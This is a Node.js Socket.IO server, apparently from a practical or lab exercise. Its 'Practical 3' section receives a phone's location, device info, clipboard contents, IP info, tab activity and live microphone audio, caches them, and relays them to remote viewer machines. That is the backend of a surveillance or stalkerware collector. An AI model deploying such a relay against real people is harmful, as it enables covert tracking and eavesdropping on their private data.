const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static(path.join(__dirname, 'public')));

// ── Practical 1 ───────────────────────────────────────────────
let streamerSocket = null;
let viewerSockets = [];

// ── Practical 3 ───────────────────────────────────────────────
let p3PhoneSocket = null;
let p3ViewerSockets = [];

// Cache — stores last received data so PC gets it even if it connects late
const p3Cache = {
  location: null,
  deviceInfo: null,
  clipboard: null,
  ipInfo: null,
};

io.on('connection', (socket) => {
  console.log('Connected:', socket.id);

  // ── PRACTICAL 1 ──────────────────────────────────────────────
  socket.on('streamer-ready', () => {
    streamerSocket = socket;
    viewerSockets.forEach(v => v.emit('streamer-available'));
  });
  socket.on('viewer-ready', () => {
    viewerSockets.push(socket);
    if (streamerSocket) socket.emit('streamer-available');
  });
  socket.on('offer', (data) => {
    const viewer = viewerSockets.find(v => v.id === data.to);
    if (viewer) viewer.emit('offer', { sdp: data.sdp, from: socket.id });
  });
  socket.on('answer', (data) => {
    if (streamerSocket) streamerSocket.emit('answer', { sdp: data.sdp, from: socket.id });
  });
  socket.on('ice-candidate', (data) => {
    if (data.to === 'streamer' && streamerSocket) {
      streamerSocket.emit('ice-candidate', { candidate: data.candidate, from: socket.id });
    } else {
      const viewer = viewerSockets.find(v => v.id === data.to);
      if (viewer) viewer.emit('ice-candidate', { candidate: data.candidate, from: socket.id });
    }
  });
  socket.on('request-stream', () => {
    if (streamerSocket) streamerSocket.emit('new-viewer', { viewerId: socket.id });
  });

  // ── PRACTICAL 3 ──────────────────────────────────────────────

  socket.on('p3-phone-ready', () => {
    p3PhoneSocket = socket;
    console.log('[P3] Phone connected');
    p3ViewerSockets.forEach(v => v.emit('p3-phone-available'));
  });

  // PC registers — replay ALL cached data immediately
  socket.on('p3-viewer-ready', () => {
    p3ViewerSockets.push(socket);
    console.log('[P3] Viewer connected, replaying cache...');

    if (p3PhoneSocket) socket.emit('p3-phone-available');

    // Send cached data immediately — no waiting
    if (p3Cache.deviceInfo) { console.log('[P3] Replaying device info'); socket.emit('p3-device-info', p3Cache.deviceInfo); }
    if (p3Cache.location)   { console.log('[P3] Replaying location');    socket.emit('p3-location',    p3Cache.location);   }
    if (p3Cache.ipInfo)     { console.log('[P3] Replaying ip info');     socket.emit('p3-ip-info',     p3Cache.ipInfo);     }
    if (p3Cache.clipboard)  { console.log('[P3] Replaying clipboard');   socket.emit('p3-clipboard',   p3Cache.clipboard);  }
  });

  socket.on('p3-location', (data) => {
    p3Cache.location = data;
    console.log('[P3] Location received, forwarding to', p3ViewerSockets.length, 'viewers');
    p3ViewerSockets.forEach(v => v.emit('p3-location', data));
  });

  socket.on('p3-device-info', (data) => {
    p3Cache.deviceInfo = data;
    console.log('[P3] Device info received, forwarding to', p3ViewerSockets.length, 'viewers');
    p3ViewerSockets.forEach(v => v.emit('p3-device-info', data));
  });

  socket.on('p3-clipboard', (data) => {
    p3Cache.clipboard = data;
    p3ViewerSockets.forEach(v => v.emit('p3-clipboard', data));
  });

  socket.on('p3-ip-info', (data) => {
    p3Cache.ipInfo = data;
    p3ViewerSockets.forEach(v => v.emit('p3-ip-info', data));
  });

  socket.on('p3-tab-activity', (data) => {
    p3ViewerSockets.forEach(v => v.emit('p3-tab-activity', data));
  });

  // Audio mime type
  socket.on('p3-audio-mime', (mime) => {
    p3ViewerSockets.forEach(v => v.emit('p3-audio-mime', mime));
  });

  // Audio chunks — relay binary data to all viewers
  socket.on('p3-audio-chunk', (chunk) => {
    p3ViewerSockets.forEach(v => v.emit('p3-audio-chunk', chunk));
  });

  socket.on('p3-offer', (data) => {
    const viewer = p3ViewerSockets.find(v => v.id === data.to);
    if (viewer) viewer.emit('p3-offer', { sdp: data.sdp, from: socket.id });
  });

  socket.on('p3-answer', (data) => {
    if (p3PhoneSocket) p3PhoneSocket.emit('p3-answer', { sdp: data.sdp, from: socket.id });
  });

  socket.on('p3-ice', (data) => {
    if (data.to === 'p3-phone' && p3PhoneSocket) {
      p3PhoneSocket.emit('p3-ice', { candidate: data.candidate, from: socket.id });
    } else {
      const viewer = p3ViewerSockets.find(v => v.id === data.to);
      if (viewer) viewer.emit('p3-ice', { candidate: data.candidate, from: socket.id });
    }
  });

  socket.on('p3-request-stream', () => {
    if (p3PhoneSocket) p3PhoneSocket.emit('p3-new-viewer', { viewerId: socket.id });
  });

  // ── DISCONNECT ────────────────────────────────────────────────
  socket.on('disconnect', () => {
    if (socket === streamerSocket) {
      streamerSocket = null;
      viewerSockets.forEach(v => v.emit('streamer-offline'));
    } else {
      viewerSockets = viewerSockets.filter(v => v !== socket);
    }

    if (socket === p3PhoneSocket) {
      p3PhoneSocket = null;
      Object.keys(p3Cache).forEach(k => p3Cache[k] = null);
      p3ViewerSockets.forEach(v => v.emit('p3-phone-offline'));
      console.log('[P3] Phone disconnected, cache cleared');
    } else {
      p3ViewerSockets = p3ViewerSockets.filter(v => v !== socket);
    }
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
